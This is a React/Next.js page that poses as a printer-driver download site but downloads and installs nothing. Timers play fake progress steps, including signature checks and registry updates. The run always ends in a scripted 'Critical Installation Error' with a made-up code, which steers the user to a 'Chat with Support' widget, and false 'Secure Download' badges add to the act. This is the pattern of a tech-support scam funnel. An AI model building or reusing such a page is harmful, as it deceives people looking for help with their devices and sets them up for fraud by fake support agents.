"use client";

import React, { useState, useEffect } from "react";
import { useParams, useRouter } from "next/navigation";
import { ChevronRight, ShieldCheck, Lock, Phone, Check, AlertTriangle, MessageSquare, Mail } from "lucide-react";
import Header from "@/components/Header";
import Footer from "@/components/Footer";

type StepConfig = {
  title: string;
  subtitle: string;
  footerText?: string;
  percentage: number;
  color: "blue" | "orange";
};

// Phase 1: Downloading sequence (Steps 1 to 6)
const downloadSteps: StepConfig[] = [
  { title: "Step 1: Initializing", subtitle: "Scanning system for hardware compatibility...", percentage: 0, color: "blue" },
  { title: "Step 2: Analyzing", subtitle: "Checking for existing driver versions and conflicts...", percentage: 15, color: "blue" },
  { title: "Step 3: Connecting", subtitle: "Establishing secure connection to official servers...", percentage: 32, color: "blue" },
  { title: "Step 4: Downloading", subtitle: "Fetching secure driver package (142.5 MB)...", percentage: 58, color: "blue" },
  { title: "Step 5: Verifying", subtitle: "Validating digital signatures and file integrity...", percentage: 74, color: "blue" },
  { title: "Step 6: Finishing", subtitle: "Preparing installer for your operating system...", percentage: 89, color: "blue" },
  { title: "Step 6: Finishing", subtitle: "Preparing installer for your operating system...", percentage: 100, color: "blue" },
];

// Phase 2: Installation sequence (Extracting -> Registry -> Service -> Finalizing)
const installSteps: StepConfig[] = [
  { title: "Extracting Files...", subtitle: "Uncompressing driver components", footerText: "Updating system registry and hardware configuration", percentage: 8, color: "orange" },
  { title: "Updating Registry...", subtitle: "Configuring system environment variables", footerText: "Updating system registry and hardware configuration", percentage: 30, color: "orange" },
  { title: "Installing Service...", subtitle: "Registering hardware background services", footerText: "Updating system registry and hardware configuration", percentage: 50, color: "orange" },
  { title: "Finalizing...", subtitle: "Cleaning up temporary installation files", footerText: "Updating system registry and hardware configuration", percentage: 75, color: "orange" },
];

export default function DownloadPage() {
    const openChat = () => {
    if (typeof window !== "undefined" && window.jivo_api) {
      window.jivo_api.open();
    }
  };
  const params = useParams();
  const router = useRouter();
  
  // Status tracking states
  const [status, setStatus] = useState<"idle" | "downloading" | "success_screen" | "installing" | "error">("idle");
  const [stepIdx, setStepIdx] = useState(0);

  const printerName = params.id 
    ? decodeURIComponent(params.id as string).replace(/-/g, " ") 
    : "Unknown Printer";

  // Handles Phase 1: Downloading Timers
  useEffect(() => {
    if (status !== "downloading") return;

    const interval = setInterval(() => {
      setStepIdx((prev) => {
        if (prev < downloadSteps.length - 1) {
          return prev + 1;
        } else {
          clearInterval(interval);
          setStatus("success_screen"); // Transition to intermediate download success screen
          return 0;
        }
      });
    }, 2000);

    return () => clearInterval(interval);
  }, [status]);

  // Handles Phase 2: Installing Timers
  useEffect(() => {
    if (status !== "installing") return;

    const interval = setInterval(() => {
      setStepIdx((prev) => {
        if (prev < installSteps.length - 1) {
          return prev + 1;
        } else {
          clearInterval(interval);
          setStatus("error"); // At the very end of installation timeline, transition into the Error Panel
          return 0;
        }
      });
    }, 2500);

    return () => clearInterval(interval);
  }, [status]);

  // Utility to map dynamic circular ring conic fills
  const getConicGradient = (percentage: number, color: "blue" | "orange") => {
    const primaryColor = color === "blue" ? "#3A76D2" : "#E06A05";
    return `conic-gradient(${primaryColor} ${percentage * 3.6}deg, #E5E7EB 0deg)`;
  };

  const currentActiveStep = status === "downloading" ? downloadSteps[stepIdx] : installSteps[stepIdx];

  return (
    <div className="min-h-screen bg-white antialiased text-[#333333] font-subheading font-normal text-[15px]">
      <Header />

      <div className="max-w-5xl mx-auto px-6 pt-8 pb-20">
        {/* Breadcrumb Navigation */}
        <div className="flex items-center space-x-2 text-[15px] text-gray-600 mb-8">
          <button onClick={() => router.push("/printer-setup")} className="hover:underline">Home</button>
          <ChevronRight className="w-3 h-3 text-gray-400" />
          <button onClick={() => router.push("/printer-setup")} className="hover:underline">Drivers</button>
          <ChevronRight className="w-3 h-3 text-gray-400" />
          <span className="text-gray-800 font-semibold">{printerName}</span>
        </div>

        {/* Main Display Container */}
        <div className="bg-white border border-gray-200 rounded-xl shadow-[0_2px_8px_rgba(0,0,0,0.04)] py-8 md:py-12 space-y-12 relative">
          
          {/* Top Panel Brand Row */}
          <div className="flex flex-col md:flex-row items-start md:items-center justify-between gap-6 border-b border-gray-100 px-8 pb-6">
            <div className="flex items-center space-x-5">
              <div className="w-14 h-14 border border-blue-100 rounded-xl flex items-center justify-center text-[#3A76D2] shadow-xs">
                <svg className="w-7 h-7" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={1.5}>
                  <path strokeLinecap="round" strokeLinejoin="round" d="M12 16.5V9.75m0 0l3 3m-3-3l-3 3M6.75 19.5a4.5 4.5 0 01-1.41-8.775 5.25 5.25 0 0110.233-2.33 3 3 0 013.758 3.848A3.752 3.752 0 0118 19.5H6.75z" />
                </svg>
              </div>
              
              <div className="space-y-0.5">
                <h2 className="text-[23px] font-semibold text-[#111111] tracking-tight">
                  {printerName}
                </h2>
                <p className="text-[14px] text-gray-400">
                  Version: 24.1.0.103 <span className="mx-1.5 text-gray-300">|</span> File size: 142.5 MB
                </p>
              </div>
            </div>

            <button 
              onClick={() => { if(status === "idle") setStatus("downloading"); }}
              disabled={status !== "idle"}
              className={`w-full md:w-auto font-medium text-[15px] px-7 py-3 rounded-lg flex items-center justify-center space-x-2 transition-all shadow-xs ${
                status !== "idle"
                  ? "bg-blue-300 text-white cursor-not-allowed" 
                  : "bg-[#007DBD] hover:bg-[#015A8E] text-white cursor-pointer"
              }`}
            >
              <svg className="w-4 h-4 stroke-[2.5]" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" d="M3 16.5v2.25A2.25 2.25 0 005.25 21h13.5A2.25 2.25 0 0021 18.75V16.5M16.5 12L12 16.5m0 0L7.5 12m4.5 4.5V3" />
              </svg>
              <span>Download Now</span>
            </button>
          </div>

          {/* Conditional Workflow Renderer */}
          {status === "idle" && (
            <div className="flex flex-col items-center justify-center max-w-2xl mx-auto space-y-3 pt-6 py-6 text-center">
              <h3 className="text-[20px] font-medium text-[#222222]">Software Installation Guide</h3>
              <p className="text-gray-500 text-[16px] leading-relaxed max-w-lg">
                Click the download button above to start getting the latest software and drivers for your device. 
                Our automated tool will help you set up everything correctly.
              </p>
            </div>
          )}

          {(status === "downloading" || status === "installing") && (
            <div className="flex flex-col items-center justify-center px-8 py-4">
              <div 
                className="w-20 h-20 rounded-full flex items-center justify-center relative shadow-xs"
                style={{ background: getConicGradient(currentActiveStep.percentage, currentActiveStep.color) }}
              >
                <div className="w-[74px] h-[74px] bg-white rounded-full absolute" />
              </div>

              <div className="text-center mt-6 space-y-2">
                <h3 className="text-[19px] font-semibold text-[#111111] tracking-tight">{currentActiveStep.title}</h3>
                <p className="text-[14px] text-gray-500">
                  {currentActiveStep.subtitle} <span className="text-gray-400">({currentActiveStep.percentage}%)</span>
                </p>
              </div>

              <div className="w-full max-w-md bg-gray-100 h-[7px] rounded-full mt-8 overflow-hidden">
                <div 
                  className={`h-full transition-all duration-500 rounded-full ${
                    currentActiveStep.color === "blue" ? "bg-[#3A76D2]" : "bg-[#E06A05]"
                  }`}
                  style={{ width: `${currentActiveStep.percentage}%` }}
                />
              </div>

              <p className="text-[12px] text-gray-400/80 mt-5 text-center">
                {currentActiveStep.footerText || "Do not refresh or close this page"}
              </p>
            </div>
          )}

          {status === "success_screen" && (
            <div className="flex flex-col items-center justify-center px-8 py-6 text-center space-y-6">
              <div className="w-16 h-16 bg-[#DCFCE7] rounded-full flex items-center justify-center text-[#22C55E]">
                <Check className="w-8 h-8 stroke-[3]" />
              </div>

              <div className="space-y-2">
                <h3 className="text-[26px] font-semibold text-[#1E7E34] tracking-tight">
                  Download Successful!
                </h3>
                <p className="text-[15px] text-gray-500 max-w-md">
                  The driver files have been prepared for your system.
                </p>
              </div>

              <div className="pt-4">
                <button 
                  onClick={() => setStatus("installing")}
                  className="px-14 py-2.5 border-2 border-[#3A76D2] text-[#3A76D2] hover:bg-[#3A76D2] hover:text-white font-medium text-[15px] rounded-full transition-all tracking-wide shadow-xs cursor-pointer"
                >
                  Install Now
                </button>
              </div>
            </div>
          )}

          {/* Phase 3: Critical Installation Error Display Layout */}
          {status === "error" && (
            <div className="flex flex-col items-center justify-center px-8 py-6 text-center space-y-5">
              <div className="w-16 h-16 bg-[#FEE2E2] rounded-full flex items-center justify-center text-[#EF4444]">
                <AlertTriangle className="w-8 h-8 stroke-[2]" />
              </div>

              <div className="space-y-2 max-w-lg mx-auto">
                <h3 className="text-[24px] font-bold text-[#DC2626] tracking-tight">
                  Critical Installation Error
                </h3>
                <p className="text-[15px] font-semibold text-gray-700">
                  Error Code: 0x800F020B
                </p>
                <p className="text-gray-500 text-[14px] leading-relaxed px-4">
                  Installation failed because the driver package is incompatible with your current system configuration or a critical dependency is missing.
                </p>
              </div>

              {/* Error Action Support Buttons */}
              <div className="flex flex-col sm:flex-row items-center justify-center gap-4 pt-6 w-full max-w-md mx-auto">
                <button onClick={openChat} className="w-full sm:w-auto bg-[#3A76D2] hover:bg-[#2C5EB0] text-white px-6 py-2.5 rounded-lg flex items-center justify-center space-x-2 font-medium text-[14px] shadow-xs cursor-pointer transition-colors">
                  <MessageSquare className="w-4 h-4 fill-white text-[#3A76D2]" />
                  <span>Chat with Support</span>
                </button>
              </div>
            </div>
          )}

        </div>

        {/* Bottom Verification Badges */}
        <div className="flex items-center justify-center space-x-8 mt-10 text-[11px] font-bold tracking-widest text-gray-400 uppercase">
          <div className="flex items-center space-x-1.5">
            <ShieldCheck className="w-4 h-4 text-gray-400 stroke-2" />
            <span>Secure Download</span>
          </div>
          <div className="flex items-center space-x-1.5">
            <Lock className="w-4 h-4 text-gray-400 stroke-2" />
            <span>Encrypted Setup</span>
          </div>
        </div>

        

      </div>

      <Footer />
    </div>
  );
}